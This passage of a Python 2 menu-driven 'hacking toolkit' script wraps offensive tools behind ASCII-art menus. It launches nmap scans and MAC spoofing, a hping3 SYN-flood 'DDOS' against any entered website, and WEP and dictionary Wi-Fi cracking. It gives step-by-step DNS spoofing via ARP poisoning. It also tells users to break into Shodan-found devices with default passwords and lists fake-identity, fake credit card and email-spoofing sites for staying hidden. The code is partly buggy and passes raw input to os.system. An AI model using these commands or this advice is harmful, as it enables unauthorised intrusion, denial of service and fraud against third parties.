            if nmap6 == '2':
               os.system("nmap -O " + domain)
            if nmap6 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '7':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Service Version Detection (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap7 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap7 == '1':
               os.system("nmap -sV " + victim)
            if nmap7 == '2':
               os.system("nmap -sV " + domain)
            if nmap7 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '8':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Firewall Detection (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap8 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap8 == '1':
               os.system("nmap -sA " + victim)
            if nmap8 == '2':
               os.system("nmap -sA " + domain)
            if nmap8 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '9':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "No Ping/Disable Host (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap9 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap9 == '1':
               os.system("nmap -Pn " + victim)
            if nmap9 == '2':
               os.system("nmap -Pn " + domain)
            if nmap9 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '10':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Stealthy Scan(Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap10 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap10 == '1':
               os.system("nmap -sS " + victim)
            if nmap10 == '2':
               os.system("nmap -sS " + domain)
            if nmap10 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '11':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Disable DNS Resolution (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap11 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap11 == '1':
               os.system("nmap -n " + victim)
            if nmap11 == '2':
               os.system("nmap -n " + domain)
            if nmap11 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '12':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Mac Address (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  Pick MAC Address to Spoof to"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Pick a Random MAC Address to Spoof to"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap12 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap12 == '1':
                print bcolors.yellow + "Type the MAC Address youd like to spoof to."
                print bcolors.yellow + "(E.g 00:00:00:00:00:00)"
                spoof = raw_input(bcolors.bold + bcolors.green + 'Type the Mac' + bcolors.white + ':~# ')
                os.system("nmap --spoof-mac " + spoof + ip)
            if nmap12 == '2':
               os.system("nmap --spof-mac 0 " + ip)
            if nmap12 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '13':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Scan for TCP/UDP Ports (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap4 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap4 == '1':
               os.system("nmap -open " + victim)
            if nmap4 == '2':
               os.system("nmap -open " + domain)
            if nmap4 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '99':
            subprocess.call(["python", "lin8x.py"])
        else:
            subprocess.call(["python", "lin8x.py"])
    if ds == '3':

        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################ 
"""

        print bcolors.white + """
		         _,.-------.,_
		     ,;~'             '~;, 
		   ,;                     ;,
		  ;                         ;
		 ,'                         ',
		,;                           ;,
		; ;      .           .      ; ;
		| ;   ______       ______   ; | 
		|  `/~"     ~" . "~     "~\'  |
		|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
		 |   |        }:{        |   | 
		 |   l       / | \       !   |
		 .~  (__,.--" .^. "--.,__)  ~. 
		 |     ---;' / | \ `;---     |  
		  \__.       \/^\/       .__/  
		   V| \                 / |V  
		    | |T~\___!___!___/~T| |  
		    | |`IIII_I_I_I_IIII'| |  
		    |  \,III I I I III,/  |  
		     \   `~~~~~~~~~~'    /
		       \   .       .   /
		         \.    ^    ./   
		           ^~~~^~~~^ 
"""

        print bcolors.green + bcolors.bold + """
  ______                     ___   _ ______       _    ___    ___ 
 / _____)                   / __) | / _____)     (_)  / __)  / __)
( (____  ____   ___   ___ _| |__ / ( (____  ____  _ _| |__ _| |__ 
 \____ \|  _ \ / _ \ / _ (_   __) / \____ \|  _ \| (_   __|_   __)
 _____) ) |_| | |_| | |_| || | / /  _____) ) | | | | | |    | |   
(______/|  __/ \___/ \___/ |_||_|  (______/|_| |_|_| |_|    |_|   
        |_|                                                       
"""

        print bcolors.red + """[1]""" + bcolors.blue + """  Setoolkit"""
        print bcolors.red + """[2]""" + bcolors.blue + """  Ghost Phisher"""
        print bcolors.red + """[3]""" + bcolors.blue + """  Wireshark"""
        print bcolors.red + """[4]""" + bcolors.blue + """  Ettercap (GUI)"""
        print bcolors.red + """[5]""" + bcolors.blue + """  Hamster"""
        print bcolors.red + """[6]""" + bcolors.blue + """  DNS Spoofing"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to menu
"""

        print bcolors.red + """############################################################ 
"""
        d2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if d2 == '1':
            os.system('setoolkit')
        if d2 == '2':
            os.system('ghost-phisher')
        if d2 == '3':
            os.system('wireshark')
        if d2 == '4':
            os.system('ettercap -G')
        if d2 == '5':
            os.system('hamster')
        if d2 == '6':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################ 
"""

            print bcolors.purple + """
  ____  _   _ ____    ____                     __ _             
 |  _ \| \ | / ___|  / ___| _ __   ___   ___  / _(_)_ __   __ _ 
 | | | |  \| \___ \  \___ \| '_ \ / _ \ / _ \| |_| | '_ \ / _` |
 | |_| | |\  |___) |  ___) | |_) | (_) | (_) |  _| | | | | (_| |
 |____/|_| \_|____/  |____/| .__/ \___/ \___/|_| |_|_| |_|\__, |
                           |_|                            |___/ 
"""

            print bcolors.red + """[1]""" + bcolors.blue + """  Ettercap (Manual)"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Custom (Automatic)"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""
            print bcolors.red + ""

            print bcolors.red + """############################################################ 
"""
            d2b = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if d2b == '1':
                clearScr()
                clearScr()
                clearScr()
                clearScr()
                clearScr()
                print bcolors.red + """############################################################ 
"""

                print bcolors.yellow + """

--- Steps to setup DNS Spoof on Ettercap-GUI ---

1. Make sure you have a downloaded version of ettercap

2. Go into the /etc/ettercap/etter.conf file (Should already be open for you)

3. Set "ec_uid" and "ec_gid" to "0" in the conf file.

4. Go to the "Linux" section and remove the "#" behind the "redir_command_on/off" under the 
iptables part.

5. Go to the /etc/ettercap/etter.dns file section

6. Replace or reuse the website to ip's for microsoft.com to the website you 
reverse_tcp to spoof, and your ip.

(E.g: facebook.com A 1.1.1.1)

7. Open the /var/www/html section and edit it to your liking

8. type "service apache2 start" in a different terminal

9. Open up the Ettercap-GUI

10. Select "Unified Sniffing..."

11. Do "Stop Sniffing" as soon as you have started it, as the tool always automatically starts 
sniffing the network when you open it.

12. Click on "Scan For Hosts" under the "Hosts" section

13. From the host list, select your victem's ip and set it to "Add to Target 1"

14. Now select the gateway ip address (You can find it by doing "route -n" in the terminal)
and select it to "Add to Target 2"

15. Now, go to the MITM tab and select "ARP Poisoning", then choose "Sniff remote connections."

16. Click on the "Plugins" Section, go to "Manage the plugins" and select DNS_Spoof as the plugin.
"""

                print bcolors.purple + """For more information on how to DNS Spoof with ettercap,
go to:

https://null-byte.wonderhowto.com/how-to/tutorial-dns-spoofing-0167796/

or

https://www.docdroid.net/QKOE7wJ/tutorial-dns-spoofing.pdf#page=2
"""

                print bcolors.red + """[1]""" + bcolors.blue + """  Open up all files for this"""
                print bcolors.red + """[2]""" + bcolors.blue + """  Open up Ettercap"""
                print bcolors.red + """[3]""" + bcolors.blue + """  Find Router/Gateway"""
                print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
"""

                print bcolors.red + """############################################################ 
"""
                d2c = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
                if d2c == '1':
                    os.system('gedit /etc/ettercap/etter.conf')
                    os.system('gedit /etc/ettercap/etter.dns')
                if d2c == '2':
                    os.system('ettercap -G')
                if d2c == '3':
                    os.system('route -n')
                if d2c == '99':
                    subprocess.call(["python", "lin8x.py"])
                else:
                    subprocess.call(["python", "lin8x.py"])
            if d2b == '99':
                subprocess.call(["python", "lin8x.py"])
            else:
                subprocess.call(["python", "lin8x.py"])
        if d2 == '99':
            subprocess.call(["python", "lin8x.py"])
        else:
            subprocess.call(["python", "lin8x.py"])
    if ds == '4':

        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################ 
"""

        print bcolors.blue + """
	                ..:::::::::..
	           ..:::aad8888888baa:::..
	        .::::d:?88888888888?::8b::::.
	      .:::d8888:?88888888??a888888b:::.
	    .:::d8888888a8888888aa8888888888b:::.
	   ::::dP::::::::88888888888::::::::Yb::::
	  ::::dP:::::::::Y888888888P:::::::::Yb::::
	 ::::d8:::::::::::Y8888888P:::::::::::8b::::
	.::::88::::::::::::Y88888P::::::::::::88::::.
	:::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
	:::::::Y88888888888P::|::Y88888888888P:::::::
	::::::::::::::::888:::|:::888::::::::::::::::
	`:::::::::::::::8888888888888b::::::::::::::'
	 :::::::::::::::88888888888888::::::::::::::
	  :::::::::::::d88888888888888:::::::::::::
	   ::::::::::::88::88::88:::88::::::::::::
	    `::::::::::88::88::88:::88::::::::::'
	      `::::::::88::88::P::::88::::::::'
	        `::::::88::88:::::::88::::::'
	           ``:::::::::::::::::::''
	                ``:::::::::''
"""

        print bcolors.white + """
	 __ __ ___ _____ __    __  ___ _   __  _ _____  
	|  V  | __|_   _/  \ /' _/| _,\ | /__\| |_   _| 
	| \_/ | _|  | || /\ |`._`.| v_/ || \/ | | | |   
	|_| |_|___| |_||_||_||___/|_| |___\__/|_| |_|   
"""

        print bcolors.red + """[1]""" + bcolors.blue + """  Msfconsole"""
        print bcolors.red + """[2]""" + bcolors.blue + """  Msfvenom"""
        print bcolors.red + """[3]""" + bcolors.blue + """  Msfpro (You need to buy in order to use)"""
        print bcolors.red + """[4]""" + bcolors.blue + """  Armitage"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to menu
"""

        print bcolors.red + """############################################################ 
"""
        d3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if d3 == '1':
            os.system('msfconsole')
        if d3 == '2':
            os.system('msfvenom')
        if d3 == '3':
            os.system('msfpro')
            subprocess.call(["python", "lin8x.py"])
        if d3 == '4':
            os.system('armitage')
        if d3 == '99':
            subprocess.call(["python", "lin8x.py"])
        else:
            subprocess.call(["python", "lin8x.py"])
    if ds == '5':
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################ 
"""

        print bcolors.purple + """
	             ..ooo@@@XXX%%%xx..
	          .oo@@XXX%x%xxx..     ` .
	        .o@XX%%xx..               ` .
	      o@X%..                  ..ooooooo
	    .@X%x.                 ..o@@^^   ^^@@o
	  .ooo@@@@@@ooo..      ..o@@^          @X%
	  o@@^^^     ^^^@@@ooo.oo@@^             %
	 xzI    -*--      ^^^o^^        --*-     %
	 @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
	I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x
	I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x
	 @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x
	  ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx
	        o@@^^^ooo I^^ I^o ooo   .  x
	        oo @^ IX      I   ^X  @^ oo
	        IX     U  .        V     IX
	         V     .           .     V
"""

        print bcolors.yellow + """
  ___                   ___          _           
 / _ \ _ __  ___ _ _   |   \ _____ _(_)__ ___ ___ 
| (_) | '_ \/ -_) ' \  | |) / -_) V / / _/ -_|_-< 
 \___/| .__/\___|_||_| |___/\___|\_/|_\__\___/__/ 
                                         
"""

        print bcolors.red + """[1]""" + bcolors.blue + """  Shodan 
(Use to find any open devices around an area by using filters)
"""
        print bcolors.red + """[2]""" + bcolors.blue + """  Zenmap
(Use to gain any open ports or scan for any open devices around
your local area)
"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to menu
"""

        print bcolors.red + """############################################################ 
"""
        d4 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if d4 == '1':
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################ 
"""
            print bcolors.green + """[Try getting a Shodan sccount before following any tips here!]
For a search engine like shodan, you can limit your searches of open devices by using filters. Filters can be used by typing things like:
City: (e.g city:sacramento)
Country: (e.g country:US)
Hostname: (e.g hostname:facebook.com)
Operating System: (e.g microsoft os:windows)
After filtering your searches, you can click on the specific device in the lists by clicking on them, the stuff that shall most likley be included with it are:
the IP address, latitude and londitude, SHH and HTTP settings, and server name.
After using this information to find the right device you reverse_tcp to get into, just click on the ip or just do a basic search in the searchbar. However, alot of devices may be blocked with a username and a password. Luckily for you, most usernames and passwords are set to default. This means that things such as (Username:Password)
Admin:Admin
Admin:12345
Admin:54321
etc...
Will work.
I also recommend that you use the shodan plugin to help narrow own your searches, as well as find any open devices that is used for a specific site. 
Alrighty, get to work my friend. Hope this was helpful!
"""
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.yellow + "https://www.shodan.io"
            print bcolors.yellow + "https://www.shodanhq.com"
            print ""
            print bcolors.red + """[99]""" + bcolors.blue + """ Back to menu"""
            print ""
            print bcolors.red + """############################################################ 
"""
            b4 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if b4 == '99':
                subprocess.call(["python", "lin8x.py"])
            else:
                subprocess.call(["python", "lin8x.py"])
        if d4 == '2':
            os.system('zenmap')
        if d4 == '99':
            subprocess.call(["python", "lin8x.py"])
        else:
            subprocess.call(["python", "lin8x.py"])
    if ds == '6':
        os.system('burpsuite')
        subprocess.call(["python", "lin8x.py"])

    if ds == "7":
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        os.system("sudo apt-get install hping3")
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################"""
        print bcolors.red + """
 (                (        )  (     
 )\ )            ))\ )  ( /(  )\ )  
(()/(         ( /(()/(  )\())(()/(  
 /(_))(    (  )\())(_))((_)\  /(_)) 
(_))  )\   )\(_))(_))_   ((_)(_))   
| _ \((_) ((_) |_ |   \ / _ \/ __|  
|   / _ \/ _ \  _|| |) | (_) \__ \  
|_|_\___/\___/\__||___/ \___/|___/  
                                    
"""
        print bcolors.red + """############################################################
"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to menu"""
        print bcolors.white + ""
        web = raw_input(" Website: ")
        if web == '99':
            subprocess.call(["python", "lin8x.py"])
        else:
            subprocess.call(["python", "lin8x.py"])
        print bcolors.red + """############################################################
"""
        print bcolors.red + """ DDOS starting in 1 second """
        print bcolors.red + """ PRESS CTRL + C TO STOP IT 
"""
        print bcolors.red + """############################################################"""
        from time import sleep
        sleep(1)
        print bcolors.white
        os.system("sudo hping3 -p 80 -S -i u3000 " + web)

############################################################

    if ds == '8':
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################"""
        print bcolors.green + """
   .~~.   .~~.
  '. \ ' ' / .'""" + bcolors.red + """
   .~ .~~~..~.
  : .~.'~'.~. :
 ~ (   ) (   ) ~ 
( : '~'.~.'~' : )
 ~ .~ (   ) ~. ~
  (  : '~' :  )
   '~ .~~~. ~'
       '~'
"""

        print bcolors.red + """[1]""" + bcolors.blue + """  Hunt Down & Crack WEP WIFIs (Airmon/Besside-ng)"""
        print bcolors.red + """[2]""" + bcolors.blue + """  Dictionary WIFI Attacks (Wifite)"""
        print bcolors.red + """[3]""" + bcolors.blue + """  Wireless GUI Cracker (Fern Wireless Cracker)"""
        print bcolors.red + """[4]""" + bcolors.blue + """  Social Engineering + MITM (Ghost Phisher)"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to menu"""

        print bcolors.white + ""
        print bcolors.red + bcolors.bold + """############################################################
"""
        wifi = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if wifi == '1':
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """WARNING: PLEASE MAKE SURE YOU HAVE AN ADAPTER
PLUGGED INTO YOUR COMPUTER AND IS ALREADY SETUP, AS WELL AS HAVE MONITOR MODE BEFORE CONTINUING! TO EXIT PLEASE DO "CTRL + C"!
"""

            print bcolors.green + """As Soon as you do all the steps in the tool 
required, type:""" + bcolors.yellow + """ "besside-ng {interface name} -c 6 -b {Specific network BSSID}" """ + bcolors.green + """

Specific Requirements to Run All of This:
Aircrack-ng (The Rest Below are Part of Aircrack-ng, but whatever.)
Airodump-ng (Listing This Just In Case)
Besside-ng (Listing This Just In Case)
"""

            print bcolors.red + """############################################################
"""
            print bcolors.red + """Please Press""" + bcolors.green + """ {ENTER} """ + bcolors.red + """to continue..."""
            wifi1 = raw_input(bcolors.white + '')
            if wifi1 == "":
                clearScr()
                clearScr()
                clearScr()
                print bcolors.green + bcolors.bold + """############################################################
"""             
                os.system('ip a')
                print bcolors.green + bcolors.bold + """
############################################################
"""
                os.system('ifconfig')
                print bcolors.green + bcolors.bold + """
############################################################
"""
                print bcolors.white + "Please type the name of your network adapter:"
                wifi2 = raw_input(bcolors.green + '')
                os.system('airodump-ng ' + wifi2 + ' --encrypt wep')
                print bcolors.white + bcolors.bold + """
############################################################
"""

                print bcolors.white + "Interface Name: " + bcolors.red + wifi2 

                print bcolors.white + bcolors.bold + """
############################################################
"""
                wifi3= raw_input(bcolors.green + """Type the Command: "besside-ng {interface name} -c 6 -b {Specific network BSSID}"
""")
                os.system(wifi3)
            else:
                subprocess.call(["python", "lin8x.py"])               
############################################################

        if wifi == 'set as 2': # Note to self. - DONT FORGET THIS U NUMSKULL! 
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + bcolors.bold + """############################################################
"""
            print bcolors.red + """WARNING: PLEASE MAKE SURE YOU HAVE AN ADAPTER
PLUGGED INTO YOUR COMPUTER AND IS ALREADY SETUP, AS WELL AS HAVE MONITOR MODE BEFORE CONTINUING! TO EXIT PLEASE DO "CTRL + C"!
"""

            print bcolors.red + bcolors.bold + """############################################################
"""
            print bcolors.red + """Please Press""" + bcolors.green + """ {ENTER} """ + bcolors.red + """to continue..."""
            wifi2 = raw_input(bcolors.white + '')
            if wifi2 == "":
                clearScr()
                clearScr()
                clearScr()
                print bcolors.green + bcolors.bold + """############################################################
"""             
                os.system('ip a')
                print bcolors.green + bcolors.bold + """
############################################################
"""
                os.system('ifconfig')
                print bcolors.green + bcolors.bold + """
############################################################
"""
                print bcolors.white + "Please type the name of your network adapter:"
                wifi2 = raw_input(bcolors.green + '')
                clearScr()
                os.system('airmon-ng start ' + wifi2)
                print bcolors.red + """As soon as the scan has been finished, type""" + bcolors.green + """airodump-ng -c [channel] --bssid [bssid] -w root/Desktop/ [monitor interface] (normally being mon0""" + bcolors.red + """ 
Please Press""" + bcolors.green + """ {ENTER} """ + bcolors.red + """to continue..."""
                wifi3 = raw_input(bcolors.white + '')
                if wifi3 == "":
                    os.system('airodump-ng ' + wifi2 + 'mon')
                else:
                    subprocess.call(["python", "lin8x.py"]) 
            else:
                subprocess.call(["python", "lin8x.py"])    

###

        if wifi == '2':
            clearScr
            clearScr
            clearScr
            os.system('wifite') 

###

        if wifi == '3':
            clearScr
            clearScr
            clearScr
            os.system('fern-wifi-cracker')

###

        if wifi == '4':
            clearScr
            clearScr
            clearScr
            os.system('ghost-phisher')

############################################################

        if wifi == '99':
            subprocess.call(["python", "lin8x.py"])

############################################################

    if ds == '99':
        subprocess.call(["python", "lin8x.py"])

############################################################

elif answer == "2":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################ 
"""

    print bcolors.green + """
   _        _              ___           
  | |      (_)    _ _     ( _ )   __ __  
  | |__    | |   | ' \    / _ \   \ \ /  
  |____|  _|_|_  |_||_|   \___/   /_\_\ """ 
    print bcolors.yellow + """_|'''''|_|'''''|_|'''''|_|'''''|_|'''''| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
"""

    print bcolors.green + """Car Tracking Sites:""" + bcolors.blue + """
https://www.autodesk.com/products/vehicle-tracking/overview
https://www.cartrack.us
https://www.gotrack.com
https://www.brickhousesecurity.com/gps-trackers/car-tracking/
"""
    print bcolors.green + """GPS Sites:""" + bcolors.blue + """
https://www.autodesk.com/products/vehicle-tracking/overview
https://www.gps.gov
https://www.gotrack.com
https://www.brickhousesecurity.com/gps-trackers/car-tracking/
"""



    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
"""

    print bcolors.red + """############################################################ 
"""

    answer4 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
    if answer4 == '99':
        subprocess.call(["python", "lin8x.py"])
    else:
        subprocess.call(["python", "lin8x.py"])

############################################################

elif answer == "4":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################
    """

    print bcolors.red + """I RECOMMEND YOU GET ONE OF EACH THING IN THIS LIST, 
AND LISTEN TO TIPS FROM THE BOOKS "GHOST IN THE WIRES" AND 
"THE ART OF INVISIBILIY" 
BY KEVIN MITNICK IN ORDER TO STAY SOMEWHAT HIDDEN!
"""

    print bcolors.green + bcolors.underline + """Phone:"""
    print bcolors.white + """FireRTC: https://www.firertc.com"""

    print bcolors.white + """ """

    print bcolors.green + bcolors.underline + """Fake Identity:"""
    print bcolors.white + """FakePersonGenerator: https://www.fakepersongenerator.com"""
    print bcolors.white + """DataFakeGenerator: http://www.datafakegenerator,com/generador.php"""
    print bcolors.white + """Elfqrin: https://www.elfqrin.com/fakeid.php"""

    print bcolors.white + """ """

    print bcolors.green + bcolors.underline + """Fake Credit Cards:"""
    print bcolors.white + """Get Credit Card #s: http://getcreditcardnumbers.com"""

    print bcolors.white + """ """


    print bcolors.green + bcolors.underline + """Emails:"""
    print bcolors.white + """Guerrilla Mail: https://www.guerrillamail.com"""
    print bcolors.white + """Mailinator: https://www.mailinator.com"""
    print bcolors.white + """Sendinc: https://www.sendinc.com"""
    print bcolors.white + """ProtonMail: https://www.protonmail.com"""
    print bcolors.white + """10minutemail.com: https://www.10minutemail.com"""
    print bcolors.white + """Tempr: https://www.tempr.email"""
    print bcolors.white + """Mail: https://www.mail.com"""
    print bcolors.white + """Outlook: https://www.outlook.com"""
    print bcolors.white + """Fakemailgenerator: http://www.fakemailgenerator.com"""
    print bcolors.white + """SpoofMyEmail: https://spoofmyemail.com"""

    print bcolors.white + """ """

    print bcolors.green + bcolors.underline + """VPNs:"""
    print bcolors.white + """OpenVPN: https://www.openvpn.com"""
    print bcolors.white + """CyberGhost: https://www.cyberghostvpn.com"""
    print bcolors.white + """NordVPN: https://nordvpn.com"""
    

    print bcolors.white + """ """



    print bcolors.green + bcolors.underline + """Proxies/Proxychains (Russian and Chinese Ones):"""
    print bcolors.white + """Proxy4Free: https://proxy4free.com/list/webproxy1.html"""
    print bcolors.white + """Free-Proxy-List: https://www.free-proxy-list.net"""
    print bcolors.white + """Oxylabs: https://oxylabs.io"""




    print bcolors.white + """ """



    print bcolors.green+ bcolors.underline + """TOR/DuckDuckGo:"""
    print bcolors.white + """Tor Browser: https://www.torproject.org/projects/torbrowser.html"""
    print bcolors.white + """DuckDuckGo: https://www.duckduckgo.com"""
    print bcolors.white + """TailsOS: https://www.tails.boum.org"""


    print bcolors.white + """ """



    print bcolors.green+ bcolors.underline + """Virtual Machines:"""
    print bcolors.white + """VirtualBox Oracle: https://www.virtualbox.org"""
    print bcolors.white + """Vmware: https://www.vmware.com"""


    print bcolors.white + """ """

    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""

    print bcolors.white + """ """

